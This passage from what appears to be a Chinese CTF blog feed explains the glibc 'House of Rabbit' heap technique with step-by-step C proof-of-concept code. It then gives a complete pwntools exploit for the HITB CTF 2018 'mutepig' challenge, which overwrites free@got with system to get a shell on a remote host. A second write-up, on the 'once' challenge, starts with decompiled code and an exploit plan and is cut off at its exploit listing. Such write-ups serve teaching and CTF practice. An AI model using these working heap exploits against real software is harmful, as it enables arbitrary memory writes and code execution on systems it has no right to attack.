class="code"><pre><span class="line">unsigned long sum;</span><br><span class="line">sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">atomic_max (&amp;mp_.max_mmapped_mem, sum);</span><br></pre></td></tr></table></figure><p>因此在第一阶段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. Make 'av-&gt;system_mem &gt; 0xa00000'</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte by mmap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte in heap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"</span>);</span><br></pre></td></tr></table></figure><p>第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000</p><p><img src="/img/house_of_rabbit/1.png" alt=""></p><h2 id="步骤2-申请小堆块并放入fastbin"><a href="#步骤2-申请小堆块并放入fastbin" class="headerlink" title="步骤2  申请小堆块并放入fastbin"></a>步骤2  申请小堆块并放入fastbin</h2><p>首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. Free fast chunk and link to fastbins</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk and link to fastbins\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">// any size in fastbins is ok </span></span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate fast chunk and small chunk.\n"</span></span><br><span class="line"><span class="string">"  fast = %p\n"</span></span><br><span class="line"><span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br></pre></td></tr></table></figure><p>此时，对应的堆结构是：</p><p><img src="/img/house_of_rabbit/2.png" alt=""></p><h2 id="步骤3-伪造堆块并劫持至fastbin"><a href="#步骤3-伪造堆块并劫持至fastbin" class="headerlink" title="步骤3 伪造堆块并劫持至fastbin"></a>步骤3 伪造堆块并劫持至fastbin</h2><p>在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。</p><p>利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. Make fake_chunk on .bss</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Make fake_chunk on .bss\n"</span>);</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x11</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line"><span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// use after free or fastbins dup etc...</span></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VULNERABILITY (e.g. UAF)\n"</span></span><br><span class="line"><span class="string">"  *fast = %p\n"</span></span><br><span class="line">, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br></pre></td></tr></table></figure><p>此时，堆块状态如下：</p><p><img src="/img/house_of_rabbit/3.png" alt=""></p><h2 id="步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin"><a href="#步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin" class="headerlink" title="步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin"></a>步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin</h2><p>在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。</p><p>触发代码如下：(malloc.c 4071)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0  0x10</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应步骤代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4. call malloc_consolidate</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4. call malloc_consolidate\n"</span></span><br><span class="line"><span class="string">"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"</span></span><br><span class="line">, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br></pre></td></tr></table></figure><p>步骤结束后，内存分布如下：</p><p><img src="/img/house_of_rabbit/4.png" alt=""></p><h2 id="步骤5-分配内存-使伪造堆块进入large-bin"><a href="#步骤5-分配内存-使伪造堆块进入large-bin" class="headerlink" title="步骤5 分配内存 使伪造堆块进入large bin"></a>步骤5 分配内存 使伪造堆块进入large bin</h2><p>当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000)</p><p>malloc检测如下（malloc.c 3473）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">           malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                            chunk2mem (victim), av);</span><br><span class="line">         size = chunksize (victim);</span><br></pre></td></tr></table></figure><p>步骤代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 5. Link unsorted bins to appropriate list</span><br><span class="line">printf(&quot;5. Link unsorted bins to appropriate list\n&quot;</span><br><span class="line">&quot;  Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;);</span><br><span class="line">gbuf[3] = 0xa00001;</span><br><span class="line">malloc(0xa00000);</span><br><span class="line">printf(&quot;  Allocate huge chunk.\n&quot;</span><br><span class="line">&quot;  Now, fake_chunk1 link to largebin[126](max).\n&quot;</span><br><span class="line">&quot;  Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;);</span><br><span class="line">gbuf[3] = 0xfffffffffffffff1;</span><br></pre></td></tr></table></figure><p>最终，程序的堆块布局如下：</p><p><img src="/img/house_of_rabbit/5.png" alt=""></p><h2 id="步骤6-任意内存分配"><a href="#步骤6-任意内存分配" class="headerlink" title="步骤6 任意内存分配"></a>步骤6 任意内存分配</h2><p>当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 6. Overwrite targer variable</span><br><span class="line">printf(&quot;6. Overwrite targer variable on .data\n&quot;</span><br><span class="line">&quot;  target is at %p\n&quot;</span><br><span class="line">&quot;  Before : %s\n&quot;</span><br><span class="line">, &amp;target, target);</span><br><span class="line"></span><br><span class="line">malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);</span><br><span class="line">victim = malloc(0x10);</span><br><span class="line">printf(&quot;  Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);</span><br><span class="line">strcpy(victim, &quot;Hacked!!&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;  After  : %s\n&quot;, target);</span><br></pre></td></tr></table></figure><h1 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h1><h2 id="HITB-CTF-2018-mutepig"><a href="#HITB-CTF-2018-mutepig" class="headerlink" title="HITB CTF 2018       mutepig"></a>HITB CTF 2018       mutepig</h2><p>题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。</p><p>坑点在于此题没有输出，调试比较坑。另外需要注意<strong>利用方法</strong>中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf=ELF(<span class="string">'mutepig'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./mutepig'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.75.128.158'</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(type,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(type))</span><br><span class="line">p.send(content)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content1,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.send(content1)</span><br><span class="line">p.send(content2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bss_list = <span class="number">0x06020C0</span></span><br><span class="line">bss_can_be_edit = <span class="number">0x602120</span></span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_0'</span>) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_1'</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'p4nda_2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'p4nda_3'</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(bss_can_be_edit+<span class="number">0x10</span>)[:<span class="number">-1</span>],p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffff1</span>)+<span class="string">'\0'</span>*<span class="number">15</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)[:<span class="number">-1</span>],p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xA00001</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_4'</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">2</span>,p64(bss_can_be_edit+<span class="number">0x10</span>)[:<span class="number">-1</span>],p64(<span class="number">0xfffffffffffffff0</span>)+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">add(<span class="number">0x3419</span>,<span class="string">'p4nda_5'</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">1</span>,p64(elf.got[<span class="string">'free'</span>])[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.symbols[<span class="string">'system'</span>])[:<span class="number">-1</span>],<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="/img/house_of_rabbit/mutepig">题目</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到&lt;strong&gt;任意&lt;/strong&gt;地址分配的目的。&lt;/p&gt;
&lt;h1 id=&quot;所需条件&quot;&gt;&lt;a href=&quot;#所需条件&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>HITB CTF 2018 部分PWN题解</title>
    <link href="http://p4nda.top/2018/04/17/hitb2018/"/>
    <id>http://p4nda.top/2018/04/17/hitb2018/</id>
    <published>2018-04-17T05:40:06.000Z</published>
    <updated>2018-04-17T06:26:38.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="once"><a href="#once" class="headerlink" title="once"></a>once</h1><p>此题共有四个函数，自行实现了一个类似于unsorted bin的数据结构，其结构体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 bin             struc ; (sizeof=0x20, mappedto_1)</span><br><span class="line">00000000 field_0         dq ?</span><br><span class="line">00000008 field_8         dd ?</span><br><span class="line">0000000C field_C         dd ?</span><br><span class="line">00000010 fd              dq ?</span><br><span class="line">00000018 bk              dq ?</span><br><span class="line">00000020 bin             ends</span><br></pre></td></tr></table></figure><p>其中第一个函数，是初始化函数，首先申请了一个0x20的数据块作为第一个堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">funtion1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// ST18_8@1</span></span><br><span class="line">  bin *ptr; <span class="comment">// rax@1</span></span><br><span class="line">  bin *mem; <span class="comment">// ST10_8@1</span></span><br><span class="line">  __int64 result; <span class="comment">// rax@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx@1</span></span><br><span class="line"></span><br><span class="line">  v0 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  ptr = (bin *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  ptr-&gt;fd = <span class="number">0L</span>L;</span><br><span class="line">  ptr-&gt;bk = <span class="number">0L</span>L;</span><br><span class="line">  mem = (bin *)bss_once_mem;</span><br><span class="line">  bss_once_mem = ptr;</span><br><span class="line">  ptr-&gt;fd = (__int64)&amp;unk_202020;</span><br><span class="line">  ptr-&gt;bk = (__int64)mem;</span><br><span class="line">  mem-&gt;fd = (__int64)ptr;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"suceess."</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  v4 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个函数，可以编辑上述堆块，造成可以覆写fd、bk指针，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">funtion2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx@4</span></span><br><span class="line">  __int64 v2; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( bss_once_flag == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write_(bss_once_mem, <span class="number">0x20</span>u);</span><br><span class="line">    bss_once_flag = <span class="number">1</span>;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"success."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三个函数，实现了一个unlink操作，由于第二个函数导致内存任意写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">funtion3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx@4</span></span><br><span class="line">  __int64 v2; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( bss_once_flag_2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    bss_once_mem = (bin *)bss_once_mem-&gt;bk;</span><br><span class="line">    bss_once_mem-&gt;fd = (__int64)&amp;unk_202020;</span><br><span class="line">    bss_once_flag_2 = <span class="number">1</span>;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"success."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四个函数中可以申请任意大的堆块，并对这个堆块申请、释放。</p><p>此题中开启了全部保护，因此无法获悉其内部任何地址。</p><p>本题解题思路是：</p><p>1 根据给定的功能泄露libc地址</p><p>2 使用1功能初始链</p><p>3 利用4功能申请一个大堆块备用</p><p>4 利用2功能，修改小堆块中的fd指针的末位字节（由于bss地址未知），使其地址指向bss段上ptr指针-0x10</p><p>5 利用3功能unlink，使bss段上ptr指针写入 PIE + 0x202020的地址</p><p>6 利用4功能中的编辑函数，由于ptr指针已被我们覆盖，因此可以对bss段上内容任意写，目的是覆盖功能2的指针及功能使用限制的标志位</p><p>7 将__free_hook覆写为system，释放堆块，得到shell</p><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 